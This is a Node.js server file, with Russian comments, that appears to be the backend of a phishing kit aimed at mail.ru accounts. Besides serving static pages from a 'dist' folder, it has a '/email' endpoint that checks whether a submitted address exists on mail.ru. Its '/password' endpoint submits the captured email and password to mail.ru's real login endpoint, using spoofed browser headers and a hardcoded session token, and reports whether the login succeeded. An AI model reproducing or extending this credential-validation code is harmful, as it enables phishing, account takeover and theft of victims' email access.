const cors = require("cors");

const http = require("http");

const fs = require('fs');
const path = require('path');

const server = http.createServer(async (req, res) => {
  cors()(req, res, () => {
    if (req.url === "/email") {
      let body = "";

      req.on("data", (chunk) => {
        body += chunk;
      });

      req.on("end", () => {
        body = JSON.parse(body);
        fetch("https://auth.mail.ru/api/v1/pushauth/info", {
          headers: {
            accept: "application/json, text/plain, */*",
            "accept-language": "ru,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,uk;q=0.6",
            "content-type":
              "multipart/form-data; boundary=----WebKitFormBoundaryf53jSMFbFPtAyZlD",
            "sec-ch-ua":
              '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
          },
          referrer: "https://account.mail.ru/",
          referrerPolicy: "strict-origin-when-cross-origin",
          body: `------WebKitFormBoundaryf53jSMFbFPtAyZlD\r\nContent-Disposition: form-data; name="login"\r\n\r\n${body.email}\r\n------WebKitFormBoundaryf53jSMFbFPtAyZlD\r\nContent-Disposition: form-data; name="htmlencoded"\r\n\r\nfalse\r\n------WebKitFormBoundaryf53jSMFbFPtAyZlD\r\nContent-Disposition: form-data; name="referrer"\r\n\r\nhttps://mail.ru/\r\n------WebKitFormBoundaryf53jSMFbFPtAyZlD--\r\n`,
          method: "POST",
          mode: "cors",
          credentials: "include",
        })
          .then((response) => response.json())
          .then((data) => {
            if (data.body.exists === true || data.body == "forbidden") {
              console.log(data);
              res.setHeader("Content-Type", "application/json");
              res.end(JSON.stringify(true));
            } else {
              console.log(data);
              res.setHeader("Content-Type", "application/json");
              res.end(JSON.stringify(false));
            }
          })
          .catch((error) => {
            console.error("Ошибка:", error);
            res.setHeader("Content-Type", "application/json");
            res.end(JSON.stringify(error));
          });
      });
    } else if (req.url === "/password") {
      let body = "";

      req.on("data", (chunk) => {
        body += chunk;
      });
      req.on("end", () => {
        body = JSON.parse(body);

        fetch("https://auth.mail.ru/cgi-bin/auth", {
          redirect: "manual",
          headers: {
            accept:
              "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "ru,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,uk;q=0.6",
            "cache-control": "max-age=0",
            "content-type": "application/x-www-form-urlencoded",
            "sec-ch-ua":
              '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            "sec-ch-ua-full-version": '"119.0.6045.160"',
            "sec-ch-ua-full-version-list":
              '"Google Chrome";v="119.0.6045.160", "Chromium";v="119.0.6045.160", "Not?A_Brand";v="24.0.0.0"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-model": '"Nexus 5"',
            "sec-ch-ua-platform": '"Android"',
            "sec-ch-ua-platform-version": '"6.0"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            Cookie: "act=ce51e932b58043ccbbf3b364cfcd90c1;",
          },
          referrer: "https://account.mail.ru/",
          referrerPolicy: "strict-origin-when-cross-origin",
          body: `username=${body.email}&Login=${body.email}&password=${body.password}&Password=${body.password}&saveauth=1&new_auth_form=1&FromAccount=opener%3Daccount%26twoSteps%3D1&act_token=ce51e932b58043ccbbf3b364cfcd90c1&page=https%3A%2F%2Fe.mail.ru%2Fmessages%2Finbox%3Fauthid%3Dlpcmac3y.5su%26back%3D1%26dwhsplit%3Ds10273.b1ss12743s%26from%3Dlogin%26show_vkc_promo%3D1%26x-login-auth%3D1&back=1&lang=ru_RU`,
          method: "POST",
          mode: "cors",
          credentials: "include",
        }).then((response) => {
          console.log(response.headers);
          const regex = /mail\.ru\/messages/;
          if(regex.test(response.headers.get('location')) ){
            console.log('true')
            res.setHeader("Content-Type", "application/json");
              res.end(JSON.stringify(true));
          }else{
            res.setHeader("Content-Type", "application/json");
            res.end(JSON.stringify(false));
          }
        }).catch((error) =>{
          console.log(error)
        });
      });
    } else if(req.url === '/'){
      const filePath = path.join(__dirname, 'dist', 'index.html');
      serveStaticFile(res, filePath, 'text/html');
      
    } else {
      const reqPath = req.url === '/' ? 'index.html' : req.url;
    const filePath = path.join(__dirname, 'dist', reqPath);
    const extname = path.extname(filePath);
    let contentType = 'text/html';

    switch (extname) {
      case '.js':
        contentType = 'text/javascript';
        break;
      case '.css':
        contentType = 'text/css';
        break;
      case '.png':
        contentType = 'image/png';
        break;
      // Добавьте обработку других типов файлов при необходимости (jpg, svg и т. д.)
      default:
        break;
    }

    serveStaticFile(res, filePath, contentType);
    }
  });
});

const PORT = process.env.PORT || 3000;

server.listen(PORT, () => {
  console.log(`Сервер запущен на порту ${PORT}`);
});

function serveStaticFile(res, filePath, contentType) {
  fs.readFile(filePath, (err, data) => {
    if (err) {
      if (err.code === 'ENOENT') {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('404 Not Found');
      } else {
        res.writeHead(500, { 'Content-Type': 'text/plain' });
        res.end('500 Internal Server Error');
      }
    } else {
      res.writeHead(200, { 'Content-Type': contentType });
      res.end(data);
    }
  });
}